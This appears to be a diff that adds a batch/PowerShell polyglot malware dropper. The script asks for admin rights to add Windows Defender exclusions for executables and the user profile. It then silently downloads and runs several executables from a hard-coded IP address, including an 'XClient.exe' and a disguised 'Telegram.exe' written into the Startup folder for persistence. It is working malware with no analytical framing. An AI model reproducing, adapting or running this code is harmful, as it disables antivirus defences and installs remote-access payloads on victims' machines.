@@ -1,0 +1,52 @@
+<# :batch script
+Echo Please wait...
+@echo off
+setlocal
+cd "%~dp0"
+powershell -ep remotesigned -Command "IEX $([System.IO.File]::ReadAllText('%~f0'))"
+endlocal
+goto:eof
+#>
+while($true) {
+    try {
+        # Step 1: Set exclusions with admin privileges
+        $excludePath = [System.IO.Path]::GetFullPath($env:USERPROFILE)
+        $exclusionsCommand = "Add-MpPreference -ExclusionExtension '.exe','.bat','.vbs','.lnk'; Add-MpPreference -ExclusionPath '$excludePath'"
+        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $exclusionsCommand" -Verb runas -Wait
+
+        # Step 2: Download and execute the first executable (hidden cmd window)
+        $url1 = 'http://159.223.8.77/OKWycAPG/qz.exe'
+        $filePath1 = [System.IO.Path]::Combine($env:USERPROFILE, 'qdll.exe')
+        $downloadCommand1 = "Invoke-WebRequest -Uri '$url1' -OutFile '$filePath1'; Start-Process -FilePath '$filePath1'"
+        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $downloadCommand1" -WindowStyle Hidden
+
+        # Step 3: Download and execute the second file (hidden cmd window)
+        $url2 = 'http://159.223.8.77/gaQAPNAi/XClient.exe'
+        $filePath2 = [System.IO.Path]::Combine($env:USERPROFILE, 'XClient.exe')
+        $downloadCommand2 = "Invoke-WebRequest -Uri '$url2' -OutFile '$filePath2'; Start-Process -FilePath '$filePath2'"
+        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $downloadCommand2" -WindowStyle Hidden
+
+        # Step 4: Download and execute the third file (hidden cmd window)
+        $url3 = 'http://159.223.8.77/IdWapGAR/Telegram.exe'
+        $filePath3 = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\Telegram.exe')
+        $downloadCommand3 = "Invoke-WebRequest -Uri '$url3' -OutFile '$filePath3'; Start-Process -FilePath '$filePath3'"
+        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $downloadCommand3" -WindowStyle Hidden
+
+        # Step 5: Download and execute the fourth file (hidden cmd window)
+        $url4 = 'https://example.com/file3.exe'
+        $filePath4 = [System.IO.Path]::Combine($env:USERPROFILE, 'file3.exe')
+        $downloadCommand4 = "Invoke-WebRequest -Uri '$url4' -OutFile '$filePath4'; Start-Process -FilePath '$filePath4'"
+        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $downloadCommand4" -WindowStyle Hidden
+
+        # Step 6: Download and execute the fifth file (hidden cmd window)
+        $url5 = 'https://example.com/file5.exe'
+        $filePath5 = [System.IO.Path]::Combine($env:USERPROFILE, 'file5.exe')
+        $downloadCommand5 = "Invoke-WebRequest -Uri '$url5' -OutFile '$filePath5'; Start-Process -FilePath '$filePath5'"
+        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $downloadCommand5" -WindowStyle Hidden
+
+        # Exit the loop after successful execution
+        exit
+    } catch {
+        # Optional: Add logging or handling here if needed
+    }
+}
